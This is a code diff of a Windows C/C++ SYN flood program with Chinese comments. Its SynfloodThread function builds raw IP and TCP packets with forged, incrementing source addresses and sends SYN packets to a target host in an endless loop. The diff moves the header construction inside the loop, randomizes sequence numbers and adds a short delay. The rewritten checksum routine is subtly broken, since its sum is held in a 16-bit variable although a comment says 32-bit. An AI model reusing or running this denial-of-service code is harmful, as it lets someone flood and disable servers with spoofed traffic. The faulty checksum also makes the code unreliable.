@@ -10,7 +10,7 @@
 
 using namespace std;
 
-#define SEQ 0x28376839               //随机号码
+#define SEQ rand()%900000000           //随机号码
 
 
 int threadnum, maxthread;             //线程控制
@@ -79,7 +79,7 @@ typedef struct iphdr
 //TCP伪首部，用于进行TCP效验和的计算，保证TCP效验的有效性(5个成员,12字节)
 struct
 {
-	unsigned long saddr;//源地址
+	unsigned long saddr;				//源地址
 	unsigned long daddr;                //目的地址
 	char mbz;                           //置空
 	char ptcl;                          //协议类型
@@ -91,7 +91,32 @@ struct
 //然后计算整个IP首部的二进制反码的和。
 USHORT checksum(USHORT *buffer, int size)
 {
-	unsigned long cksum = 0;
+	//将变量放入寄存器, 提高处理效率.
+	register int len = size;
+	//16bit
+	register USHORT *p = buffer;
+	//32bit
+	register USHORT sum = 0;
+
+	//16bit求和
+	while (len >= 2)
+	{
+		sum += *(p++) & 0x0000ffff;
+		len -= 2;
+	}
+
+	//最后的单字节直接求和
+	if (len == 1) {
+		sum += *((USHORT *)p);
+	}
+
+	//高16bit与低16bit求和, 直到高16bit为0
+	while ((sum & 0xffff0000) != 0) {
+		sum = (sum >> 16) + (sum & 0x0000ffff);
+	}
+	return (USHORT)(~sum);
+
+	/*unsigned long cksum = 0;
 	while (size >1)
 	{
 		cksum += *buffer++;
@@ -100,7 +125,7 @@ USHORT checksum(USHORT *buffer, int size)
 	if (size) cksum += *(UCHAR*)buffer;
 	cksum = (cksum >> 16) + (cksum & 0xffff);
 	cksum += (cksum >> 16);
-	return (USHORT)(~cksum);
+	return (USHORT)(~cksum);*/
 }
 
 
@@ -108,7 +133,7 @@ USHORT checksum(USHORT *buffer, int size)
 DWORD WINAPI SynfloodThread(LPVOID lp)
 {
 	SOCKET  sock = NULL;
-	int ErrorCode = 0, flag = true, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0, SendSEQ = 0;
+	int ErrorCode = 0, flag = 1, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0, SendSEQ = 0;
 	struct        sockaddr_in sockAddr;
 	TCP_HEADER  tcpheader;
 	IP_HEADER   ipheader;
@@ -117,6 +142,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 
 	//创建套接字
 	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
+	//sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 	if (sock == INVALID_SOCKET)
 	{
 		printf("Socket failed: %d\n", WSAGetLastError());
@@ -125,7 +151,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 
 
 	//设置IP_HDRINCL以便自己填充IP首部
-	ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(int));
+	ErrorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag));
 	if (ErrorCode == SOCKET_ERROR)
 	{
 		printf("Set sockopt failed: %d\n", WSAGetLastError());
@@ -145,68 +171,63 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 	//设置目标地址
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	sockAddr.sin_family = AF_INET;
-	sockAddr.sin_addr.s_addr = inet_addr(DestIP);
+	sockAddr.sin_addr.S_un.S_addr = inet_addr(DestIP);
 	sockAddr.sin_port = htons(port);
-	FakeIpNet = inet_addr("10.168.150.1");
+	
+	FakeIpNet = inet_addr("192.168.0.104");
 	FakeIpHost = ntohl(FakeIpNet);
-
-
-	//填充IP首部
-	ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
-	ipheader.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
-	ipheader.ident = 1;
-	ipheader.frag_and_flags = 0;
-	ipheader.ttl = 128;
-	ipheader.proto = IPPROTO_TCP;
-	ipheader.checksum = 0;
-	ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
-	ipheader.destIP = inet_addr(DestIP);
-
-
-	//填充TCP首部
-	tcpheader.th_sport = htons(7000);
-	tcpheader.th_dport = htons(port);	
-	tcpheader.th_seq = htonl(SEQ + SendSEQ);
-	tcpheader.th_ack = 0;
-	tcpheader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
-	tcpheader.th_flag = 2;
-	tcpheader.th_win = htons(16384);
-	tcpheader.th_urp = 0;
-	tcpheader.th_sum = 0;
-
-
-	//填充TCP伪首部
-	PSD_HEADER.saddr = ipheader.sourceIP;
-	PSD_HEADER.daddr = ipheader.destIP;
-	PSD_HEADER.mbz = 0;
-	PSD_HEADER.ptcl = IPPROTO_TCP;
-	PSD_HEADER.tcpl = htons(sizeof(tcpheader));
-
-
+	
 	for (;;)
 	{
-		SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
-		//ip头
+		//SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
+		SendSEQ = SendSEQ + 1;
+
+		//填充IP首部
+		ipheader.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
+		ipheader.tos = 0;
+		ipheader.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
+		ipheader.ident = 1;
+		ipheader.frag_and_flags = 0x40;   //3位标志位
+		ipheader.ttl = 128;
+		ipheader.proto = IPPROTO_TCP;
 		ipheader.checksum = 0;
 		ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
-		//tcp头
+		ipheader.destIP = sockAddr.sin_addr.S_un.S_addr;
+
+
+		//填充TCP首部
+		tcpheader.th_sport = htons(7000);
+		tcpheader.th_dport = htons(port);
 		tcpheader.th_seq = htonl(SEQ + SendSEQ);
-		//tcpheader.th_sport = htons(SendSEQ);
+		tcpheader.th_ack = 0;
+		tcpheader.th_lenres = (sizeof(tcpheader) / 4 << 4 | 0);
+		tcpheader.th_flag = 0x02; //SYN 标志      //0,2,4,8,16,32->FIN,SYN,RST,PSH,ACK,URG;
+		tcpheader.th_win = htons(512);
+		tcpheader.th_urp = 0;
 		tcpheader.th_sum = 0;
-		//TCP伪首部
+
+		//填充TCP伪首部
 		PSD_HEADER.saddr = ipheader.sourceIP;
+		PSD_HEADER.daddr = ipheader.destIP;
+		PSD_HEADER.mbz = 0;
+		PSD_HEADER.ptcl = IPPROTO_TCP;
+		PSD_HEADER.tcpl = htons(sizeof(tcpheader));
 
 
 		//把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP效验和
 		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
 		memcpy(sendBuf + sizeof(PSD_HEADER), &tcpheader, sizeof(tcpheader));
 		tcpheader.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpheader));
+		//计算IP首部检验和
 		memcpy(sendBuf, &ipheader, sizeof(ipheader));
 		memcpy(sendBuf + sizeof(ipheader), &tcpheader, sizeof(tcpheader));
 		memset(sendBuf + sizeof(ipheader) + sizeof(tcpheader), 0, 4);
 		dataSize = sizeof(ipheader) + sizeof(tcpheader);
 		ipheader.checksum = checksum((USHORT *)sendBuf, dataSize);
-		memcpy(sendBuf, &ipheader, sizeof(ipheader));
+
+		//用IP头和TCP头填充szSendBuf字符数组
+		memcpy(sendBuf, &ipheader, sizeof(ipheader)); // 填充发送缓冲区
+		memcpy(sendBuf + sizeof(ipheader), &tcpheader, sizeof(tcpheader)); //填充发送缓冲区
 		int retSend = sendto(sock, sendBuf, dataSize, 0, (struct sockaddr*) &sockAddr, sizeof(sockAddr));
 		if (retSend == SOCKET_ERROR)
 		{
@@ -216,7 +237,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 		}
 		
 		display();
-		//Sleep(2000);
+		Sleep(100);
 	}
 
 
